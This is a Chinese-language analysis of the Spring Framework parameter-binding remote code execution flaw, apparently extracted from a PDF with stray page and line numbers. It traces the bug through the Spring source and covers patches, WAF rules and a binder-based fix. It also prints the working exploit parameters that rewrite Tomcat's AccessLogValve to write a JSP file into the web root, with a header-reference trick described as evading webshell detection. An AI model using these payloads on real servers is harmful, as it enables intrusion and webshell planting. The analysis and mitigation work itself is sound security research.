1
spring beans RCE
Spring MVC 框架的参数绑定功能提供了将请求中的参数绑定控制器⽅法中参数对象的成员变量，攻击
者通过构造恶意请求获取AccessLogValve 对象并注⼊恶意字段值触发 pipeline 机制可写⼊任意路径下
的⽂件。 
简答来说就是参数绑定造成的变量覆盖漏洞，漏洞点spring-beans包中。 
⽆ 
JDK>=9 
springMVC 全版本 
根据之前的漏洞分析 
http://rui0.cn/archives/1158，其中⼀个点在于获取BeanInfo，位置在CachedIntrospectionResults
构造⽅法，下个断点，发送请求断下 
漏洞介绍 
漏洞编号 
影响范围 
漏洞分析 
属性注⼊分析 
2
之前的补丁是把classLoader等危险属性过滤掉了。 
跟踪如上堆栈发现，新版本和旧版本参数绑定的类有所不⼀样，具体位置如下，setPropertyValue也叫
属性注⼊ 
org\springframework\beans\AbstractNestablePropertyAccessor.class#setPropertyValue
3
补充：AbstractNestablePropertyAccessor 类通过其成员属性提供了⼀种⽀持嵌套属性的数据结构 
这段的理解参考 https://www.cnblogs.com/binarylei/p/10267928.html 
getPropertyAccessorForPropertyPath  根据属性(propertyPath)获取所在 bean 的包装对象 
beanWrapper。如果是类似  director.info.name  的嵌套属性，则需要递归获取。真正获取指定
Java
复制代码
// 1. 递归获取 propertyName 属性所在的 beanWrapper，如 director.info.name 获
取 name 属性所在的 info bean
AbstractNestablePropertyAccessor nestedPa = 
getPropertyAccessorForPropertyPath(propertyName);
// 2. 获取属性的 token
PropertyTokenHolder tokens = getPropertyNameTokens(getFinalPath(nestedPa, 
propertyName));
// 3. 设置属性值
nestedPa.setPropertyValue(tokens, new PropertyValue(propertyName, 
value));
1
2
3
4
5
6
4
属性的包装对象则由⽅法  getNestedPropertyAccessor  完成。 
可以看到  getPropertyAccessorForPropertyPath 的递归调⽤ 
也就是bean属性的递归获取，⽐如我这个环境中，最外层BeanWrapperImpl封装的是UserInfo，我传参
是 
Java
复制代码
protected AbstractNestablePropertyAccessor 
getPropertyAccessorForPropertyPath(String propertyPath) {
    // 1. 获取第⼀个点之前的属性部分。eg: director.info.name 返回 department
    int pos = 
PropertyAccessorUtils.getFirstNestedPropertySeparatorIndex(propertyPath);
    // 2. 递归处理嵌套属性
    // 2.1 先获取 director 属性所在类的 rootBeanWrapper
    // 2.2 再获取 info 属性所在类的 directorBeanWrapper
    // 2.3 依此类推，获取最后⼀个属性 name 属性所在类的 infoBeanWrapper
    if (pos > -1) {
        String nestedProperty = propertyPath.substring(0, pos);
        String nestedPath = propertyPath.substring(pos + 1);
        AbstractNestablePropertyAccessor nestedPa = 
getNestedPropertyAccessor(nestedProperty);
        return nestedPa.getPropertyAccessorForPropertyPath(nestedPath);
    // 3. 当前对象直接返回
    } else {
        return this;
    }
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
5
对应的就是我controller中的⼊参类 
我传参  class.module.classLoader.resources.context.parent.appBase  
第⼀次获取class对应的BeanWrapperImpl 
6
UserInfo除了基础的四个属性以外，还有⼀个  class  
并且在嵌套属性  nestedPropertyAccessors （这个是缓存后有的，直接在beanInfo⾥也能看）中
也直观看到class  
利⽤链分析 
AbstractNestablePropertyAccessor.class#getPropertyAccessorForProper...Java
复制代码
this.getNestedPropertyAccessor(nestedProperty)
    this.getPropertyValue(tokens)
        this.getLocalPropertyHandler(actualName)
 this.getCachedIntrospectionResults().getPropertyDescriptor(propertyName) 
// propertyName=class
1
2
3
4
7
展开可以看到套娃⼀样的嵌套属性 
8
class.module.classLoader.resources.context  ⽤对象如何获取呢，对应代码如下，也就
是多个  getter 串起来 
9
获取到的就是StandardContext，是不是在内存⻢也⻅过。 
进⼀步获取appBase也就顺理成章，最终聚焦下parent，也就是StandardHost 
class.module.classLoader.resources.context.parent 
Java
复制代码
((org.apache.catalina.loader.ParallelWebappClassLoader)  new 
UserInfo().getClass().getModule().getClassLoader()).getResources().getCon
text()
1
Java
复制代码
((org.apache.catalina.loader.ParallelWebappClassLoader)  new 
UserInfo().getClass().getModule().getClassLoader()).getResources().getCon
text().getParent()
1
10
公开的利⽤链也就是pipeline下的AccessLogValue的利⽤，这个类⽤来设置⽇志存储参数，包括路径、
后缀，修改参数即可达到写⼊任意⽂件的⽬的。 
11
AccessLogValue的属性可参考tomcat官⽅⽂档 
https://tomcat.apache.org/tomcat-8.5-doc/config/valve.html 
通过属性注⼊修改AccessLogValue的⼏个属性如下 
AccessLogValue构造 
12
由于%会被过滤，pattern⾥通过引⽤头部来实现构造。 
PS: 注意每次写新的⽂件，需要修改suffix、prefix以及fileDateFormat，否则⽂件路径不会修改。 
fileDataFormat：默认是.yyyy-MM-dd，尽量只⽤数字，因为字⺟会被解析格式化 
suffix：只要有后缀即可 
prefix：可任意 
pattern：格式⼀般是%h %l %u %t "%r" %s %b ，所以%会被格式化，但通过%{xxx}i可引⽤请求头字
段，即可保证任意字符写⼊，并且可以实现字符拼接，绕过webshell检测。 
http://xiaobaoqiu.github.io/blog/2014/12/30/tomcat-access-logpei-zhi/ 
Java
复制代码
class.module.classLoader.resources.context.parent.appBase=./
class.module.classLoader.resources.context.parent.pipeline.first.pattern=
%25{Prefix123}i+1231231+%25{Suffix123}i
class.module.classLoader.resources.context.parent.pipeline.first.suffix=r
andom1111.jsp
class.module.classLoader.resources.context.parent.pipeline.first.director
y=.
class.module.classLoader.resources.context.parent.pipeline.first.prefix=w
ebapps/ROOT/random1111
class.module.classLoader.resources.context.parent.pipeline.first.fileDate
Format=time_fomrat_random111
1
2
3
4
5
6
Java
复制代码
%{xxx}i 请求headers的信息
%{xxx}o 响应headers的信息
%{xxx}c 请求cookie的信息
%{xxx}r xxx是ServletRequest的⼀个属性
%{xxx}s xxx是HttpSession的⼀个属性
1
2
3
4
5
13
JDK1.8下测试，class bean下没有module bean，导致后续⽆法利⽤，如果是class.classLoader则会被
⿊名单拦截。 
查了下module对应的类是java.lang.Module,是JDK9引⼊的，JDK9引⼊了模块系统。 
https://blog.csdn.net/charles_neil/article/details/114460702 
补充下： 
⿊名单判断逻辑，beanClass⾮Class或者属性name⾮(classLoader|protectionDomain)，满意⼀个即
可，⽽jdk8中没有module，只能⽤class.classLoader调⽤，⽽这样两个条件都不满⾜，导致⽆法绕
过。 
bypass原因分析 
CachedIntrospectionResults.class
Java
复制代码
Class.class != beanClass || !"classLoader".equals(pd.getName()) && 
!"protectionDomain".equals(pd.getName())
1
14
jdk9为什么能绕过呢，因为他多了⼀个module，如class.module.classLoader，这样module就满⾜第
⼀个条件，⽽不去判断第⼆个条件，从⽽绕过⿊名单。 
之前struts2出过类似漏洞，有⼈编写了⼀个jsp来遍历 
https://cs.github.com/julianvilas/rooted2k15/blob/a00055f906502dd038b908a84907b74b38e26b
20/struts-tester/struts-tester.jsp 
细节看代码，主要把这个替换成⾃⼰的模型类，也就是控制器⽅法的⼊参类，以此为起点来获取  gett
er 和  setter  
效果如下，其他嵌套属性有啥⽤，就待⼤家⾃⾏摸索了。 
如何遍历嵌套属性 
15
做了属性值的获取，通过getPropertyAccessorForPropertyPath获取即可，示例代码如下 
16
Java
复制代码
BeanWrapperImpl bw = new BeanWrapperImpl(this.initarget);
String propertyName = poc + "." + fieldName;
Integer offset = propertyName.indexOf(prefix);
if (offset != -1) {
    propertyName = propertyName.substring(offset + prefix.length());
}
String value = "";
String type = "";
try {
    BeanWrapperImpl bwl = (BeanWrapperImpl)invoke(bw, 
"getPropertyAccessorForPropertyPath", propertyName);
    // TODO: 这⾥私有属性和getter对应不上，应该不算bean，默认还是通过私有属性反射
    Object v = getFieldValue(bwl.getWrappedInstance(), fieldName);
    value = v.toString();
    type = v.getClass().getName();
} catch (Exception  e) {
    value = "";
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
17
再看⼀下JDK9 springboot下的，和springMVC的classloader不⼀样，是  AppClassLoader ，没有
getResources()。 
springMVC是  ParallelWebappClassLoader  
18
然后看下JDK8的springMVC，如下所示，protectionDomain是在⿊名单内，所以连属性值都获取不
到。 
19
PS: 没有解析到值的，说明那个属性是错误的，不是bean的属性。 
这⾥是打印的存在setter的属性，不打印只有getter的属性。 
所以总结下 
>=JDK9。 
springMVC。 
请求接⼝对应的是控制器⽅法。 
⽅法⼊参是⾮基础类，不能是String，int等 
请求⽅法要和控制器⽅法对应上，否则⽆法访问。 
官⽅补丁 
https://github.com/spring-projects/spring-
framework/commit/afbff391d8299034cd98af968981504b6ca7b38c 
临时⽅案 
（⼀）WAF防护 
在WAF等⽹络防护设备上，根据实际部署业务的流量情况，实现
对“class.*”“Class.*”“*.class.*”“*.Class.*”等字符串的规则过滤，并在部暑过滤规则后，对业务运⾏
情况进⾏测试，避免产⽣额外影响。 
(⼆)临时修复措施 
需同时按以下两个步骤进⾏漏涧的临时修复: 
1.在应⽤中全局搜索@InitBinder注解，看看⽅法体内是否调⽤dataBinder.setDisallowedFields⽅法，
如果发现此代码⽚段的引⼊，则在原来的⿊名单中，添加{"class.*","Class. *","*. class.*", 
"*.Class.*"}。 (注:如果此代码⽚段使⽤较多,需要每个地⽅都追加) 
2. 在应⽤系统的项⽬包下新建以下全局类，并保证这个类被Spring 加载到(推荐在Controller 所在的包
中添加).完成类添加后，需对项⽬进⾏重新编译打包和功能验证测试。并重新发布项⽬。 
利⽤条件 
●
●
●
●
●
修复建议 
20
https://github.com/spring-projects/spring-
framework/commit/afbff391d8299034cd98af968981504b6ca7b38c 
2022年3⽉31⽇18:31:58 
Refine PropertyDescriptor filtering  
补丁很简单，当beanClass是class.Class时，只允许添加name属性。 
并且如果属性是  ClassLoader  和  ProtectionDomain ，也会被忽略。 
补丁分析 
Java
复制代码
import org.springframework.core.annotation.Order;
import org.springframework.web.bind.WebDataBinder;
import org.springframework.web.bind.annotation.ControllerAdvice;
import org.springframework.web.bind.annotation.InitBinder;
@ControllerAdvice
@Order(10000)
public class GlobalControllerAdvice{ 
    @InitBinder
    public void setAllowedFields(webdataBinder dataBinder){
        String[]abd=new string[]
{"class.*","Class.*","*.class.*","*.Class.*"};
        dataBinder.setDisallowedFields(abd);
    }
}
1
2
3
4
5
6
7
8
9
10
11
12
13
21
class.classLoader.resources.dirCon想·text.docBase 
CVE-2010-1622 http://rui0.cn/archives/1158 
http://xiaobaoqiu.github.io/blog/2014/12/30/tomcat-access-logpei-zhi/ 
https://tomcat.apache.org/tomcat-8.5-doc/config/valve.html 
https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement 
利⽤需要找控制器⽅法⼊参是⼀个⾮基础类，⽐如⼊参是String则⽆法触发参数绑定。 
参考链接 
其他注意事项 
22